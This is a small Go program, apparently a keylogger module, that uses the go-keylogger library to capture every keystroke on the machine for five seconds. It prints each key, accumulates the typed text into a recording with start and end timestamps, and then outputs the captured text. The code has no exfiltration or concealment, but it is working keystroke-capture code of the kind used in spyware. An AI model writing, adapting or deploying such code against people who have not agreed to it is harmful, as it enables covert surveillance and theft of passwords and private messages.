package main

import (
	"fmt"
	"github.com/kindlyfire/go-keylogger"
	"time"
)

const (
	delayKeyfetchMS = 5
)

type Keyloggerinfo struct {
	Recording     string
	StartTime     time.Time
	EndTime       time.Time
	KeyLoggerId   int64
	KeyLoggerOver bool
}

/**
返回Json：键盘记录结果，键盘记录开始时间，键盘记录结束时间
*/

func RunKeyLogger(keyloggerinfo *Keyloggerinfo) {
	newKeyloggerinfo := keyloggerinfo
	newKeyloggerinfo.StartTime = time.Now()
	kl := keylogger.NewKeylogger()
	for {
		key := kl.GetKey()
		if !key.Empty {
			fmt.Printf("'%c' %d                     \n", key.Rune, key.Keycode)
			newKeyloggerinfo.Recording = newKeyloggerinfo.Recording + string(key.Rune)
		}
		time.Sleep(delayKeyfetchMS * time.Millisecond)
		if newKeyloggerinfo.KeyLoggerOver {
			break
		}
	}
	newKeyloggerinfo.EndTime = time.Now()
}
func main() {

	kellogg := &Keyloggerinfo{KeyLoggerOver: false}
	go RunKeyLogger(kellogg)
	time.Sleep(5000 * time.Millisecond)
	kellogg.KeyLoggerOver = true
	print(kellogg.Recording)
	var input string
	fmt.Scanln(&input)
}
